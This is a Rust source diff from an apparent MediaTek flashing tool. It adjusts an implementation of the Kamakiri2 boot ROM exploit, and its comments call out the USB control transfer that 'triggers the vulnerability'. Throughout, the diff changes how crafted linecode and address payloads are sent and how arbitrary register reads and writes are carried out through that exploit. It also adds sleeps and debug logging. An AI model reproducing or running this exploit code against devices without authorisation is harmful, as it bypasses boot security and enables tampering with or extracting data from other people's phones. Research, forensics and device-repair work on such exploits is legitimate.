@@ -42,14 +42,16 @@ impl Preloader {
     fn kamakiri2_step(&mut self, lc: &[u8], _ptr_da_bra: u32, addr: u32) -> Result<(), String> {
         debug!("[STEP] addr=0x{:08X}", addr);
         if self.device.is_libusb() {
-            // libusb 路径：USB control transfer exploit
             let mut d = lc.to_vec();
             d.extend(&addr.to_le_bytes());
+            debug!("[STEP] payload({} bytes): {:02X?}", d.len(), d);
+            debug!("[STEP]   linecode: {:02X?}", lc);
+            debug!("[STEP]   addr_le: {:02X?}", &addr.to_le_bytes());
             self.device.ctrl_transfer_out(0x21, 0x20, 0, 0, &d)?;
-            // 对齐 Python：第二个 ctrl_transfer_in 触发漏洞
+            std::thread::sleep(Duration::from_millis(10));
             let _ = self.device.ctrl_transfer_in(0x80, 0x6, 0x02FF, 0, 9);
+            std::thread::sleep(Duration::from_millis(50));
         } else {
-            // 串口路径：NO-OP（对齐刷机匣行为 — 跳过 setup steps）
             debug!("[STEP] serial mode — skipping kamakiri2 setup step");
         }
         Ok(())
@@ -82,12 +84,12 @@ impl Preloader {
         if !self.device.is_libusb() {
             self.da_setup(lc, ptr_da_bra, watchdog)?;
             if addr < 0x40 {
-                let r = self.brom_register_access(0, addr, len / 4, None, true)?;
+                let r = self.brom_register_access(0, addr, len, None, true)?;
                 Ok(r.unwrap_or_default())
             } else {
-                let bra_addr = addr.wrapping_sub(0x40);
+                let bra_addr = addr.wrapping_sub(0x40);  // 对齐 Python：addr - 0x40
                 debug!("[da_read] bra_addr=0x{:08X}", bra_addr);
-                let r = self.brom_register_access(0, bra_addr, len / 4, None, true)?;
+                let r = self.brom_register_access(0, bra_addr, len, None, true)?;
                 Ok(r.unwrap_or_default())
             }
         } else {
@@ -100,7 +102,8 @@ impl Preloader {
                 self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(3))?;
                 self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(4))?;
                 self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(5))?;
-                let r = self.brom_register_access(0, addr, len / 4, None, true)?;
+                std::thread::sleep(Duration::from_millis(50));
+                let r = self.brom_register_access(0, addr, len, None, true)?;
                 Ok(r.unwrap_or_default())
             } else {
                 // addr >= 0x40: 3 additional steps (-2, -3, -4), then use addr - 0x40
@@ -109,7 +112,8 @@ impl Preloader {
                 self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(4))?;
                 let bra_addr = addr.wrapping_sub(0x40);
                 debug!("[da_read] using bra_addr=0x{:08X} (libusb path, addr-0x40)", bra_addr);
-                let r = self.brom_register_access(0, bra_addr, len / 4, None, true)?;
+                std::thread::sleep(Duration::from_millis(50));
+                let r = self.brom_register_access(0, bra_addr, len, None, true)?;
                 Ok(r.unwrap_or_default())
             }
         }
@@ -138,15 +142,15 @@ impl Preloader {
             self.da_setup(lc, ptr_da_bra, watchdog)?;
             if addr < 0x40 {
                 debug!("[da_write] bra_addr=0x{:08X} (no offset)", addr);
-                self.brom_register_access(1, addr, (data.len() / 4) as u32, Some(data), check_status)?;
+                self.brom_register_access(1, addr, data.len() as u32, Some(data), check_status)?;
                 Ok(())
             } else {
-                let bra_addr = addr.wrapping_sub(0x40);
-                debug!("[da_write] bra_addr=0x{:08X} (addr-0x40)", bra_addr);
+                let bra_addr = addr.wrapping_sub(0x40);  // 对齐 Python：addr - 0x40
+                debug!("[da_write] bra_addr=0x{:08X}", bra_addr);
                 self.brom_register_access(
                     1,
                     bra_addr,
-                    (data.len() / 4) as u32,
+                    data.len() as u32,
                     Some(data),
                     check_status,
                 )?;
@@ -163,7 +167,8 @@ impl Preloader {
                 self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(4))?;
                 self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(5))?;
                 debug!("[da_write] bra_addr=0x{:08X} (no offset)", addr);
-                self.brom_register_access(1, addr, (data.len() / 4) as u32, Some(data), check_status)?;
+                std::thread::sleep(Duration::from_millis(50));
+                self.brom_register_access(1, addr, data.len() as u32, Some(data), check_status)?;
                 Ok(())
             } else {
                 // addr >= 0x40: 3 additional steps (-2, -3, -4), then use addr - 0x40
@@ -172,10 +177,11 @@ impl Preloader {
                 self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(4))?;
                 let bra_addr = addr.wrapping_sub(0x40);
                 debug!("[da_write] using bra_addr=0x{:08X} (libusb path, addr-0x40)", bra_addr);
+                std::thread::sleep(Duration::from_millis(50));
                 self.brom_register_access(
                     1,
                     bra_addr,
-                    (data.len() / 4) as u32,
+                    data.len() as u32,
                     Some(data),
                     check_status,
                 )?;
@@ -207,14 +213,15 @@ impl Preloader {
             ptr_da_bra, ptr_da
         );
 
-        // linecode：libusb 通过 ctrl_transfer 动态获取，串口使用全零（Kamakiri2 serial 路径不依赖 linecode）
+        // linecode：libusb 通过 ctrl_transfer 动态获取（7 字节），补齐 1 字节零到 8 字节
         let linecode = if self.device.is_libusb() {
             info!("[EXPLOIT] using libusb backend — Kamakiri2 via ctrl_transfer");
-            // 从设备读取 linecode（对齐 Python：7 字节，不补齐）
-            self.device.ctrl_transfer_in(0xA1, 0x21, 0, 0, 7)?
+            let mut linecode = self.device.ctrl_transfer_in(0xA1, 0x21, 0, 0, 7)?;
+            linecode.push(0);
+            linecode
         } else {
             info!("[EXPLOIT] using serial backend — Kamakiri2 via brom_register_access");
-            vec![0u8; 7]  // 对齐 libusb 路径：7 字节
+            vec![0u8; 8]
         };
         let lc = linecode;
         debug!("[inject] linecode={:02X?}", lc);
